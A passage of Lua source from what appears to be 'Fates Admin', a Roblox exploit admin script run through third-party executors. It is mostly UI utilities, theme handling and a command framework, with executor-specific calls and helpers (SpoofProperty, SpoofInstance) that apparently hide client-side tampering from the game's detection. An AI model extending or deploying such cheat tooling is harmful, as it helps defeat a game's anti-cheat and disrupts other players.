			end, function(i, v)
				local H, S, V = ToHSV(v);
				return {H, S, V, "Color3"}
			end)
			local Data = JSONEncode(Services.HttpService, ValuesToEncode);
			writefile("fates-admin/Theme.json", Data);
		end
	end

	GetThemeConfig = function()
		if (IsSupportedExploit and isfolder("fates-admin")) then
			if (isfile("fates-admin/Theme.json")) then
				local Success, Data = pcall(JSONDecode, Services.HttpService, readfile("fates-admin/Theme.json"));
				if (not Success or type(Data) ~= 'table') then
					WriteThemeConfig();
					return Values
				end
				local DecodedData = deepsearchset(Data, function(i, v)
					return type(v) == 'table' and #v == 4 and v[4] == "Color3"
				end, function(i,v)
					return Color3.fromHSV(v[1], v[2], v[3]);
				end)
				return DecodedData            
			else
				WriteThemeConfig();
				return Values
			end
		else
			return Values
		end
	end

	local LoadTheme;
	do
		local Config = GetConfig();
		CommandBarPrefix = isfolder and (Config.CommandBarPrefix and Enum.KeyCode[Config.CommandBarPrefix] or Enum.KeyCode.Semicolon) or Enum.KeyCode.Semicolon

		local Theme = GetThemeConfig();
		LoadTheme = function(Theme)
			UITheme.Background.BackgroundColor = Theme.Background.BackgroundColor
			UITheme.Background.Transparency = Theme.Background.Transparency

			UITheme.ChatLogs.BackgroundColor = Theme.ChatLogs.BackgroundColor
			UITheme.CommandBar.BackgroundColor = Theme.CommandBar.BackgroundColor
			UITheme.Config.BackgroundColor = Theme.Config.BackgroundColor
			UITheme.Notification.BackgroundColor = Theme.Notification.BackgroundColor
			UITheme.CommandList.BackgroundColor = Theme.Notification.BackgroundColor

			UITheme.ChatLogs.TextColor = Theme.ChatLogs.TextColor
			UITheme.CommandBar.TextColor = Theme.CommandBar.TextColor
			UITheme.Config.TextColor = Theme.Config.TextColor
			UITheme.Notification.TextColor = Theme.Notification.TextColor
			UITheme.CommandList.TextColor = Theme.Notification.TextColor

			UITheme.ChatLogs.Transparency = Theme.ChatLogs.Transparency
			UITheme.CommandBar.Transparency = Theme.CommandBar.Transparency
			UITheme.Config.Transparency = Theme.Config.Transparency
			UITheme.Notification.Transparency = Theme.Notification.Transparency
			UITheme.CommandList.Transparency = Theme.Notification.Transparency
		end
		LoadTheme(Theme);
	end
	--END IMPORT [ui]



	--IMPORT [utils]
	Utils.Tween = function(Object, Style, Direction, Time, Goal)
		local TweenService = Services.TweenService
		local TInfo = TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction])
		local Tween = TweenService.Create(TweenService, Object, TInfo, Goal)

		Tween.Play(Tween)

		return Tween
	end

	Utils.MultColor3 = function(Color, Delta)
		local clamp = math.clamp
		return Color3.new(clamp(Color.R * Delta, 0, 1), clamp(Color.G * Delta, 0, 1), clamp(Color.B * Delta, 0, 1));
	end

	Utils.Click = function(Object, Goal) -- Utils.Click(Object, "BackgroundColor3")
		local Hover = {
			[Goal] = Utils.MultColor3(Object[Goal], 0.9)
		}

		local Press = {
			[Goal] = Utils.MultColor3(Object[Goal], 1.2)
		}

		local Origin = {
			[Goal] = Object[Goal]
		}

		AddConnection(CConnect(Object.MouseEnter, function()
			Utils.Tween(Object, "Sine", "Out", .5, Hover);
		end));

		AddConnection(CConnect(Object.MouseLeave, function()
			Utils.Tween(Object, "Sine", "Out", .5, Origin);
		end));

		AddConnection(CConnect(Object.MouseButton1Down, function()
			Utils.Tween(Object, "Sine", "Out", .3, Press);
		end));

		AddConnection(CConnect(Object.MouseButton1Up, function()
			Utils.Tween(Object, "Sine", "Out", .4, Hover);
		end));
	end

	Utils.Blink = function(Object, Goal, Color1, Color2) -- Utils.Click(Object, "BackgroundColor3", NormalColor, OtherColor)
		local Normal = {
			[Goal] = Color1
		}

		local Blink = {
			[Goal] = Color2
		}

		local Tween = Utils.Tween(Object, "Sine", "Out", .5, Blink)
		CWait(Tween.Completed);

		Tween = Utils.Tween(Object, "Sine", "Out", .5, Normal)
		CWait(Tween.Completed);
	end

	Utils.Hover = function(Object, Goal)
		local Hover = {
			[Goal] = Utils.MultColor3(Object[Goal], 0.9)
		}

		local Origin = {
			[Goal] = Object[Goal]
		}

		AddConnection(CConnect(Object.MouseEnter, function()
			Utils.Tween(Object, "Sine", "Out", .5, Hover);
		end));

		AddConnection(CConnect(Object.MouseLeave, function()
			Utils.Tween(Object, "Sine", "Out", .5, Origin);
		end));
	end

	Utils.Draggable = function(Ui, DragUi)
		local DragSpeed = 0
		local StartPos
		local DragToggle, DragInput, DragStart, DragPos

		DragUi = Dragui or Ui
		local TweenService = Services.TweenService

		local function UpdateInput(Input)
			local Delta = Input.Position - DragStart
			local Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)

			Utils.Tween(Ui, "Linear", "Out", .25, {
				Position = Position
			});
			local Tween = TweenService.Create(TweenService, Ui, TweenInfo.new(0.25), {Position = Position});
			Tween.Play(Tween);
		end

		AddConnection(CConnect(Ui.InputBegan, function(Input)
			if ((Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch) and Services.UserInputService.GetFocusedTextBox(Services.UserInputService) == nil) then
				DragToggle = true
				DragStart = Input.Position
				StartPos = Ui.Position

				AddConnection(CConnect(Input.Changed, function()
					if (Input.UserInputState == Enum.UserInputState.End) then
						DragToggle = false
					end
				end));
			end
		end));

		AddConnection(CConnect(Ui.InputChanged, function(Input)
			if (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
				DragInput = Input
			end
		end));

		AddConnection(CConnect(Services.UserInputService.InputChanged, function(Input)
			if (Input == DragInput and DragToggle) then
				UpdateInput(Input)
			end
		end));
	end

	Utils.SmoothScroll = function(content, SmoothingFactor) -- by Elttob
		-- get the 'content' scrolling frame, aka the scrolling frame with all the content inside
		-- if smoothing is enabled, disable scrolling
		content.ScrollingEnabled = false

		-- create the 'input' scrolling frame, aka the scrolling frame which receives user input
		-- if smoothing is enabled, enable scrolling
		local input = Clone(content)

		input.ClearAllChildren(input);
		input.BackgroundTransparency = 1
		input.ScrollBarImageTransparency = 1
		input.ZIndex = content.ZIndex + 1
		input.Name = "_smoothinputframe"
		input.ScrollingEnabled = true
		input.Parent = content.Parent

		-- keep input frame in sync with content frame
		local function syncProperty(prop)
			AddConnection(CConnect(GetPropertyChangedSignal(content, prop), function()
				if prop == "ZIndex" then
					-- keep the input frame on top!
					input[prop] = content[prop] + 1
				else
					input[prop] = content[prop]
				end
			end));
		end

		syncProperty "CanvasSize"
		syncProperty "Position"
		syncProperty "Rotation"
		syncProperty "ScrollingDirection"
		syncProperty "ScrollBarThickness"
		syncProperty "BorderSizePixel"
		syncProperty "ElasticBehavior"
		syncProperty "SizeConstraint"
		syncProperty "ZIndex"
		syncProperty "BorderColor3"
		syncProperty "Size"
		syncProperty "AnchorPoint"
		syncProperty "Visible"

		-- create a render stepped connection to interpolate the content frame position to the input frame position
		local smoothConnection = AddConnection(CConnect(RenderStepped, function()
			local a = content.CanvasPosition
			local b = input.CanvasPosition
			local c = SmoothingFactor
			local d = (b - a) * c + a

			content.CanvasPosition = d
		end));

		AddConnection(CConnect(content.AncestryChanged, function()
			if content.Parent == nil then
				Destroy(input);
				Disconnect(smoothConnection);
			end
		end));
	end

	Utils.TweenAllTransToObject = function(Object, Time, BeforeObject) -- max transparency is max object transparency, swutched args bc easier command
		local Descendants = GetDescendants(Object);
		local OldDescentants = GetDescendants(BeforeObject);
		local Tween -- to use to wait

		Tween = Utils.Tween(Object, "Sine", "Out", Time, {
			BackgroundTransparency = BeforeObject.BackgroundTransparency
		})

		for i = 1, #Descendants do
			local v = Descendants[i]
			local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
			local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
			local IsScrollingFrame = IsA(v, "ScrollingFrame")

			if (IsA(v, "GuiObject")) then
				if (IsText) then
					Utils.Tween(v, "Sine", "Out", Time, {
						TextTransparency = OldDescentants[i].TextTransparency,
						TextStrokeTransparency = OldDescentants[i].TextStrokeTransparency,
						BackgroundTransparency = OldDescentants[i].BackgroundTransparency
					})
				elseif (IsImage) then
					Utils.Tween(v, "Sine", "Out", Time, {
						ImageTransparency = OldDescentants[i].ImageTransparency,
						BackgroundTransparency = OldDescentants[i].BackgroundTransparency
					})
				elseif (IsScrollingFrame) then
					Utils.Tween(v, "Sine", "Out", Time, {
						ScrollBarImageTransparency = OldDescentants[i].ScrollBarImageTransparency,
						BackgroundTransparency = OldDescentants[i].BackgroundTransparency
					})
				else
					Utils.Tween(v, "Sine", "Out", Time, {
						BackgroundTransparency = OldDescentants[i].BackgroundTransparency
					})
				end
			end
		end

		return Tween
	end

	Utils.SetAllTrans = function(Object)
		Object.BackgroundTransparency = 1

		local Descendants = GetDescendants(Object);
		for i = 1, #Descendants do
			local v = Descendants[i]
			local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
			local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
			local IsScrollingFrame = IsA(v, "ScrollingFrame")

			if (IsA(v, "GuiObject")) then
				v.BackgroundTransparency = 1

				if (IsText) then
					v.TextTransparency = 1
				elseif (IsImage) then
					v.ImageTransparency = 1
				elseif (IsScrollingFrame) then
					v.ScrollBarImageTransparency = 1
				end
			end
		end
	end

	Utils.TweenAllTrans = function(Object, Time)
		local Tween -- to use to wait

		Tween = Utils.Tween(Object, "Sine", "Out", Time, {
			BackgroundTransparency = 1
		})

		local Descendants = GetDescendants(Object);
		for i = 1, #Descendants do
			local v = Descendants[i]
			local IsText = IsA(v, "TextBox") or IsA(v, "TextLabel") or IsA(v, "TextButton")
			local IsImage = IsA(v, "ImageLabel") or IsA(v, "ImageButton")
			local IsScrollingFrame = IsA(v, "ScrollingFrame")

			if (IsA(v, "GuiObject")) then
				if (IsText) then
					Utils.Tween(v, "Sine", "Out", Time, {
						TextTransparency = 1,
						BackgroundTransparency = 1
					})
				elseif (IsImage) then
					Utils.Tween(v, "Sine", "Out", Time, {
						ImageTransparency = 1,
						BackgroundTransparency = 1
					})
				elseif (IsScrollingFrame) then
					Utils.Tween(v, "Sine", "Out", Time, {
						ScrollBarImageTransparency = 1,
						BackgroundTransparency = 1
					})
				else
					Utils.Tween(v, "Sine", "Out", Time, {
						BackgroundTransparency = 1
					})
				end
			end
		end

		return Tween
	end

	Utils.TextSize = function(Object)
		local TextService = Services.TextService
		return TextService.GetTextSize(TextService, Object.Text, Object.TextSize, Object.Font, Vector2.new(Object.AbsoluteSize.X, 1000)).Y
	end

	Utils.Notify = function(Caller, Title, Message, Time)
		if (not Caller or Caller == LocalPlayer) then
			local Notification = UI.Notification
			local NotificationBar = UI.NotificationBar

			local Clone = Clone(Notification)

			local function TweenDestroy()
				if (Utils and Clone) then
					local Tween = Utils.TweenAllTrans(Clone, .25)

					CWait(Tween.Completed)
					Destroy(Clone);
				end
			end

			Clone.Message.Text = Message
			Clone.Title.Text = Title or "Notification"
			Utils.SetAllTrans(Clone)
			Utils.Click(Clone.Close, "TextColor3")
			Clone.Visible = true
			Clone.Size = UDim2.fromOffset(Clone.Size.X.Offset, Utils.TextSize(Clone.Message) + Clone.Size.Y.Offset - Clone.Message.TextSize);
			Clone.Parent = NotificationBar

			coroutine.wrap(function()
				local Tween = Utils.TweenAllTransToObject(Clone, .5, Notification)

				CWait(Tween.Completed);
				wait(Time or 5);

				if (Clone) then
					TweenDestroy();
				end
			end)()

			AddConnection(CConnect(Clone.Close.MouseButton1Click, TweenDestroy));
			if (Title ~= "Warning" and Title ~= "Error") then
				Utils.Print(format("%s - %s", Title, Message), Caller, true);
			end

			return Clone
		else
			local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
			ChatRemote.FireServer(ChatRemote, format("/w %s [FA] %s: %s", Caller.Name, Title, Message), "All");
		end
	end

	Utils.MatchSearch = function(String1, String2)
		return String1 == sub(String2, 1, #String1);
	end

	Utils.StringFind = function(Table, String)
		for _, v in ipairs(Table) do
			if (Utils.MatchSearch(String, v)) then
				return v
			end
		end
	end

	Utils.GetPlayerArgs = function(Arg)
		Arg = lower(Arg);
		local SpecialCases = {"all", "others", "random", "me", "nearest", "farthest", "npcs", "allies", "enemies"}
		if (Utils.StringFind(SpecialCases, Arg)) then
			return Utils.StringFind(SpecialCases, Arg);
		end

		local CurrentPlayers = GetPlayers(Players);
		for i, v in next, CurrentPlayers do
			local Name, DisplayName = v.Name, v.DisplayName
			if (Name ~= DisplayName and Utils.MatchSearch(Arg, lower(DisplayName))) then
				return lower(DisplayName);
			end
			if (Utils.MatchSearch(Arg, lower(Name))) then
				return lower(Name);
			end
		end
	end

	Utils.ToolTip = function(Object, Message)
		local CloneToolTip
		local TextService = Services.TextService

		AddConnection(CConnect(Object.MouseEnter, function()
			if (Object.BackgroundTransparency < 1 and not CloneToolTip) then
				local TextSize = TextService.GetTextSize(TextService, Message, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24

				CloneToolTip = Clone(UI.ToolTip)
				CloneToolTip.Text = Message
				CloneToolTip.TextScaled = TextSize
				CloneToolTip.Visible = true
				CloneToolTip.Parent = UI
			end
		end))

		AddConnection(CConnect(Object.MouseLeave, function()
			if (CloneToolTip) then
				Destroy(CloneToolTip);
				CloneToolTip = nil
			end
		end))

		if (LocalPlayer) then
			AddConnection(CConnect(Mouse.Move, function()
				if (CloneToolTip) then
					CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
				end
			end))
		else
			delay(3, function()
				LocalPlayer = Players.LocalPlayer
				AddConnection(CConnect(Mouse.Move, function()
					if (CloneToolTip) then
						CloneToolTip.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
					end
				end))
			end)
		end
	end

	Utils.ClearAllObjects = function(Object)
		local Children = GetChildren(Object);
		for i = 1, #Children do
			local Child = Children[i]
			if (IsA(Child, "GuiObject")) then
				Destroy(Child);
			end
		end
	end

	Utils.Rainbow = function(TextObject)
		local Text = TextObject.Text
		local Frequency = 1 -- determines how quickly it repeats
		local TotalCharacters = 0
		local Strings = {}

		TextObject.RichText = true

		for Character in gmatch(Text, ".") do
			if match(Character, "%s") then
				Strings[#Strings + 1] = Character
			else
				TotalCharacters = TotalCharacters + 1
				Strings[#Strings + 1] = {'<font color="rgb(%i, %i, %i)">' .. Character .. '</font>'}
			end
		end

		local Connection = AddConnection(CConnect(Heartbeat, function()
			local String = ""
			local Counter = TotalCharacters

			for _, CharacterTable in ipairs(Strings) do
				local Concat = ""

				if (type(CharacterTable) == "table") then
					Counter = Counter - 1
					local Color = Color3.fromHSV(-atan(math.tan((tick() + Counter/math.pi)/Frequency))/math.pi + 0.5, 1, 1)

					CharacterTable = format(CharacterTable[1], floor(Color.R * 255), floor(Color.G * 255), floor(Color.B * 255))
				end

				String = String .. CharacterTable
			end

			TextObject.Text = String .. " "
		end));
		delay(150, function()
			Disconnect(Connection);
		end)

	end

	Utils.Vector3toVector2 = function(Vector)
		local Tuple = WorldToViewportPoint(Camera, Vector);
		return Vector2New(Tuple.X, Tuple.Y);
	end

	Utils.AddTag = function(Tag)
		if (not Tag) then
			return
		end
		local PlrCharacter = GetCharacter(Tag.Player)
		if (not PlrCharacter) then
			return
		end
		local Billboard = InstanceNew("BillboardGui");
		Billboard.Parent = UI
		Billboard.Name = GenerateGUID(Services.HttpService);
		Billboard.AlwaysOnTop = true
		Billboard.Adornee = FindFirstChild(PlrCharacter, "Head") or nil
		Billboard.Enabled = FindFirstChild(PlrCharacter, "Head") and true or false
		Billboard.Size = UDim2.new(0, 200, 0, 50)
		Billboard.StudsOffset = Vector3New(0, 4, 0);

		local TextLabel = InstanceNew("TextLabel", Billboard);
		TextLabel.Name = GenerateGUID(Services.HttpService);
		TextLabel.TextStrokeTransparency = 0.6
		TextLabel.BackgroundTransparency = 1
		TextLabel.TextColor3 = Color3.new(0, 255, 0);
		TextLabel.Size = UDim2.new(0, 200, 0, 50);
		TextLabel.TextScaled = false
		TextLabel.TextSize = 15
		TextLabel.Text = format("%s (%s)", Tag.Name, Tag.Tag);

		if (Tag.Rainbow) then
			Utils.Rainbow(TextLabel)
		end
		if (Tag.Colour) then
			local TColour = Tag.Colour
			TextLabel.TextColor3 = Color3.fromRGB(TColour[1], TColour[2], TColour[3]);
		end

		local Added = AddConnection(CConnect(Tag.Player.CharacterAdded, function()
			Billboard.Adornee = WaitForChild(Tag.Player.Character, "Head");
		end));

		AddConnection(CConnect(Players.PlayerRemoving, function(plr)
			if (plr == Tag.Player) then
				Disconnect(Added);
				Destroy(Billboard);
			end
		end))
	end

	Utils.TextFont = function(Text, RGB)
		RGB = concat(RGB, ",")
		local New = {}
		gsub(Text, ".", function(x)
			New[#New + 1] = x
		end)
		return concat(map(New, function(i, letter)
			return format('<font color="rgb(%s)">%s</font>', RGB, letter)
		end)) .. " "
	end

	Utils.Thing = function(Object)
		local Container = InstanceNew("Frame");
		local Hitbox = InstanceNew("ImageButton");
		local UDim2fromOffset = UDim2.fromOffset

		Container.Name = "Container"
		Container.Parent = Object.Parent
		Container.BackgroundTransparency = 1.000
		Container.BorderSizePixel = 0
		Container.Position = Object.Position
		Container.ClipsDescendants = true
		Container.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y);
		Container.ZIndex = Object

		Object.AutomaticSize = Enum.AutomaticSize.X
		Object.Size = UDim2.fromScale(1, 1)
		Object.Position = UDim2.fromScale(0, 0)
		Object.Parent = Container
		Object.TextTruncate = Enum.TextTruncate.None
		Object.ZIndex = Object.ZIndex + 2

		Hitbox.Name = "Hitbox"
		Hitbox.Parent = Container.Parent
		Hitbox.BackgroundTransparency = 1.000
		Hitbox.Size = Container.Size
		Hitbox.Position = Container.Position
		Hitbox.ZIndex = Object.ZIndex + 2

		local MouseOut = true

		AddConnection(CConnect(Hitbox.MouseEnter, function()
			if Object.AbsoluteSize.X > Container.AbsoluteSize.X then
				MouseOut = false
				repeat
					local Tween1 = Utils.Tween(Object, "Quad", "Out", .5, {
						Position = UDim2fromOffset(Container.AbsoluteSize.X - Object.AbsoluteSize.X, 0);
					})
					CWait(Tween1.Completed);
					wait(.5);
					local Tween2 = Utils.Tween(Object, "Quad", "Out", .5, {
						Position = UDim2fromOffset(0, 0);
					})
					CWait(Tween2.Completed);
					wait(.5);
				until MouseOut
			end
		end))

		AddConnection(CConnect(Hitbox.MouseLeave, function()
			MouseOut = true
			Utils.Tween(Object, "Quad", "Out", .25, {
				Position = UDim2fromOffset(0, 0);
			});
		end))

		return Object
	end

	function Utils.Intro(Object)
		local Frame = InstanceNew("Frame");
		local UICorner = InstanceNew("UICorner");
		local CornerRadius = FindFirstChild(Object, "UICorner") and Object.UICorner.CornerRadius or UDim.new(0, 0)
		local UDim2fromOffset  = UDim2.fromOffset

		Frame.Name = "IntroFrame"
		Frame.ZIndex = 1000
		Frame.Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
		Frame.AnchorPoint = Vector2.new(.5, .5)
		Frame.Position = UDim2.new(Object.Position.X.Scale, Object.Position.X.Offset + (Object.AbsoluteSize.X / 2), Object.Position.Y.Scale, Object.Position.Y.Offset + (Object.AbsoluteSize.Y / 2))
		Frame.BackgroundColor3 = Object.BackgroundColor3
		Frame.BorderSizePixel = 0

		UICorner.CornerRadius = CornerRadius
		UICorner.Parent = Frame

		Frame.Parent = Object.Parent

		if (Object.Visible) then
			Frame.BackgroundTransparency = 1

			local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
				BackgroundTransparency = 0
			});

			CWait(Tween.Completed);
			Object.Visible = false

			local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
				Size = UDim2fromOffset(0, 0);
			});

			Utils.Tween(UICorner, "Quad", "Out", .25, {
				CornerRadius = UDim.new(1, 0)
			});

			CWait(Tween.Completed);
			Destroy(Frame);
		else
			Frame.Visible = true
			Frame.Size = UDim2fromOffset(0, 0)
			UICorner.CornerRadius = UDim.new(1, 0)

			local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
				Size = UDim2fromOffset(Object.AbsoluteSize.X, Object.AbsoluteSize.Y)
			});

			Utils.Tween(UICorner, "Quad", "Out", .25, {
				CornerRadius = CornerRadius
			});

			CWait(Tween.Completed);
			Object.Visible = true

			local Tween = Utils.Tween(Frame, "Quad", "Out", .25, {
				BackgroundTransparency = 1
			})

			CWait(Tween.Completed);
			Destroy(Frame);
		end
	end

	Utils.MakeGradient = function(ColorTable)
		local Table = {}
		local ColorSequenceKeypointNew = ColorSequenceKeypoint.new
		for Time, Color in next, ColorTable do
			Table[#Table + 1] = ColorSequenceKeypointNew(Time - 1, Color);
		end
		return ColorSequence.new(Table)
	end

	Utils.Debounce = function(Func)
		local Debounce = false

		return function(...)
			if (not Debounce) then
				Debounce = true
				Func(...);
				Debounce = false
			end
		end
	end

	Utils.ToggleFunction = function(Container, Enabled, Callback) -- fpr color picker
		local Switch = Container.Switch
		local Hitbox = Container.Hitbox
		local Color3fromRGB = Color3.fromRGB
		local UDim2fromOffset = UDim2.fromOffset

		Container.BackgroundColor3 = Color3fromRGB(255, 79, 87);

		if not Enabled then
			Switch.Position = UDim2fromOffset(2, 2)
			Container.BackgroundColor3 = Color3fromRGB(25, 25, 25);
		end

		AddConnection(CConnect(Hitbox.MouseButton1Click, function()
			Enabled = not Enabled

			Utils.Tween(Switch, "Quad", "Out", .25, {
				Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2fromOffset(2, 2)
			});
			Utils.Tween(Container, "Quad", "Out", .25, {
				BackgroundColor3 = Enabled and Color3fromRGB(255, 79, 87) or Color3fromRGB(25, 25, 25);
			});

			Callback(Enabled);
		end));
	end

	do
		local AmountPrint, AmountWarn, AmountError = 0, 0, 0;

		Utils.Warn = function(Text, Plr)
			local TimeOutputted = os.date("%X");
			local Clone = Clone(UI.MessageOut);

			Clone.Name = "W" .. tostring(AmountWarn + 1);
			Clone.Text = format("%s -- %s", TimeOutputted, Text);
			Clone.TextColor3 = Color3.fromRGB(255, 218, 68);
			Clone.Visible = true
			Clone.TextTransparency = 1
			Clone.Parent = Console.Frame.List

			Utils.Tween(Clone, "Sine", "Out", .25, {
				TextTransparency = 0
			})

			Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			AmountWarn = AmountWarn + 1
			Utils.Notify(Plr, "Warning", Text);
		end

		Utils.Error = function(Text, Caller, FromNotif)
			local TimeOutputted = os.date("%X");
			local Clone = Clone(UI.MessageOut);

			Clone.Name = "E" .. tostring(AmountError + 1);
			Clone.Text = format("%s -- %s", TimeOutputted, Text);
			Clone.TextColor3 = Color3.fromRGB(215, 90, 74);
			Clone.Visible = true
			Clone.TextTransparency = 1
			Clone.Parent = Console.Frame.List

			Utils.Tween(Clone, "Sine", "Out", .25, {
				TextTransparency = 0
			})

			Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			AmountError = AmountError + 1
		end

		Utils.Print = function(Text, Caller, FromNotif)
			local TimeOutputted = os.date("%X");
			local Clone = Clone(UI.MessageOut);

			Clone.Name = "P" .. tostring(AmountPrint + 1);
			Clone.Text = format("%s -- %s", TimeOutputted, Text);
			Clone.Visible = true
			Clone.TextTransparency = 1
			Clone.Parent = Console.Frame.List

			Utils.Tween(Clone, "Sine", "Out", .25, {
				TextTransparency = 0
			})

			Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
			AmountPrint = AmountPrint + 1
			if (len(Text) <= 35 and not FromNotif) then
				Utils.Notify(Caller, "Output", Text);
			end
		end
	end
	--END IMPORT [utils]



	-- commands table
	local CommandsTable = {}
	local RespawnTimes = {}

	local HasTool = function(plr)
		plr = plr or LocalPlayer
		local CharChildren, BackpackChildren = GetChildren(GetCharacter(plr)), GetChildren(plr.Backpack);
		local ToolFound = false
		local tbl = tbl_concat(CharChildren, BackpackChildren);
		for i = 1, #tbl do
			local v = tbl[i]
			if (IsA(v, "Tool")) then
				ToolFound = true
				break;
			end
		end
		return ToolFound
	end

	local isR6 = function(plr)
		plr = plr or LocalPlayer
		local Humanoid = GetHumanoid(plr);
		if (Humanoid) then
			return Humanoid.RigType == Enum.HumanoidRigType.R6
		end
		return false
	end

	local isSat = function(plr)
		plr = plr or LocalPlayer
		local Humanoid = GetHumanoid(plr)
		if (Humanoid) then
			return Humanoid.Sit
		end
	end

	local DisableAnimate = function()
		local Animate = GetCharacter().Animate
		Animate = IsA(Animate, "LocalScript") and Animate or nil
		if (Animate) then
			SpoofProperty(Animate, "Disabled");
			Animate.Disabled = true
		end
	end

	local GetCorrectToolWithHandle = function()
		local Tools = filter(tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(LocalPlayer.Character)), function(i, Tool)
			local Correct = IsA(Tool, "Tool");
			if (Correct and (Tool.RequiresHandle or FindFirstChild(Tool, "Handle"))) then
				local Descendants = GetDescendants(Tool);
				for i = 1, #Descendants do
					local Descendant = Descendants[i]
					if (IsA(Descendant, "Sound") or IsA(Descendant, "Camera") or IsA(Descendant, "LocalScript")) then
						Destroy(Descendant);
					end
				end
				return true
			end
			return false
		end)

		return Tools[1]
	end

	local CommandRequirements = {
		[1] = {
			Func = HasTool,
			Message = "You need a tool for this command"
		},
		[2] = {
			Func = isR6,
			Message = "You need to be R6 for this command"
		},
		[3] = {
			Func = function()
				return GetCharacter() ~= nil
			end,
			Message = "You need to be spawned for this command"
		}
	}

	local AddCommand = function(name, aliases, description, options, func, isplugin)
		local Cmd = {
			Name = name,
			Aliases = aliases,
			Description = description,
			Options = options,
			Function = function()
				for i, v in next, options do
					if (type(v) == 'function' and v() == false) then
						Utils.Warn("You are missing something that is needed for this command", LocalPlayer);
						return nil
					elseif (type(v) == 'number' and CommandRequirements[v].Func() == false) then
						Utils.Warn(CommandRequirements[v].Message, LocalPlayer);
						return nil
					end
				end
				return func
			end,
			ArgsNeeded = tonumber(filter(options, function(i,v)
				return type(v) == "string"
			end)[1]) or 0,
			Args = filter(options, function(i, v)
				return type(v) == "table"
			end)[1] or {},
			CmdEnv = {},
			IsPlugin = isplugin == true
		}

		CommandsTable[name] = Cmd
		if (type(aliases) == 'table') then
			for i, v in next, aliases do
				CommandsTable[v] = Cmd
			end
		end
		return Success
	end

	local RemoveCommand = function(Name)
		local Command = LoadCommand(Name);
		if (Command) then
			CommandsTable[Name] = nil
			local CommandsList = Commands.Frame.List
			local CommandLabel = FindFirstChild(CommandsList, Name);
			if (CommandLabel) then
				Destroy(CommandLabel);
			end
			return true
		end
		return false
	end

	local LoadCommand = function(Name)
		return rawget(CommandsTable, Name);
	end

	local PluginConf;
	local ExecuteCommand = function(Name, Args, Caller)
		local Command = LoadCommand(Name);
		if (Command) then
			if (Command.ArgsNeeded > #Args) then
				return Utils.Warn(format("Insuficient Args (you need %d)", Command.ArgsNeeded), LocalPlayer);
			end

			local Context;
			local sett, gett = syn and syn_context_set or setidentity, syn and syn_context_get or getidentity
			if (Command.IsPlugin and sett and gett and PluginConf.SafePlugins) then
				Context = gett();
				sett(2);
			end
			local Success, Ret = xpcall(function()
				local Func = Command.Function();
				if (Func) then
					local Executed = Func(Caller, Args, Command.CmdEnv);
					if (Executed) then
						Utils.Notify(Caller, "Command", Executed);
					end
					if (Command.Name ~= "lastcommand") then
						if (#LastCommand == 3) then
							LastCommand = shift(LastCommand);
						end
						LastCommand[#LastCommand + 1] = {Command.Name, Args, Caller, Command.CmdEnv}
					end
				end
				Success = true
			end, function(Err)
				if (Debug) then
					Utils.Error(format("[FA CMD Error]: Command = '%s' Traceback = '%s'", Name, debug.traceback(Err)), Caller);
					Utils.Notify(Caller, "Error", format("error in the '%s' command, more info shown in console", Name));
				end
			end);
			if (Command.IsPlugin and sett and PluginConf.SafePlugins and Context) then
				sett(Context);
			end
		else
			Utils.Warn("couldn't find the command " .. Name, Caller);
		end
	end

	local ReplaceHumanoid = function(Hum, R)
		local Humanoid = Hum or GetHumanoid();
		local NewHumanoid = Clone(Humanoid);
		if (R) then
			NewHumanoid.Name = "1"
		end
		NewHumanoid.Parent = Humanoid.Parent
		NewHumanoid.Name = Humanoid.Name
		Services.Workspace.Camera.CameraSubject = NewHumanoid
		Destroy(Humanoid);
		SpoofInstance(NewHumanoid);
		return NewHumanoid
	end

	local ReplaceCharacter = function()
		local Char = LocalPlayer.Character
		local Model = InstanceNew("Model");
		LocalPlayer.Character = Model
		LocalPlayer.Character = Char
		Destroy(Model);
		return Char
	end

	local CFrameTool = function(tool, pos)
		local RightArm = FindFirstChild(GetCharacter(), "RightLowerArm") or FindFirstChild(GetCharacter(), "Right Arm");
		local Arm = RightArm.CFrame * CFrameNew(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0);
		local Frame = Inverse(toObjectSpace(Arm, pos));

		tool.Grip = Frame
	end

	_L.Sanitize = function(value)
		if typeof(value) == 'CFrame' then
			local components = {components(value)}
			for i,v in pairs(components) do
				components[i] = floor(v * 10000 + .5) / 10000
			end
			return 'CFrameNew('..concat(components, ', ')..')'
		end
	end

	local AddPlayerConnection = function(Player, Connection, CEnv)
		if (CEnv) then
			CEnv[#CEnv + 1] = Connection
		else
			Connections.Players[Player.Name].Connections[#Connections.Players[Player.Name].Connections + 1] = Connection
		end
		return Connection
	end


	local DisableAllCmdConnections = function(Cmd)
		local Command = LoadCommand(Cmd)
		if (Command and Command.CmdEnv) then
			for i, v in next, flat(Command.CmdEnv) do
				if (type(v) == 'userdata' and v.Disconnect) then
					Disconnect(v);
				end
			end
		end
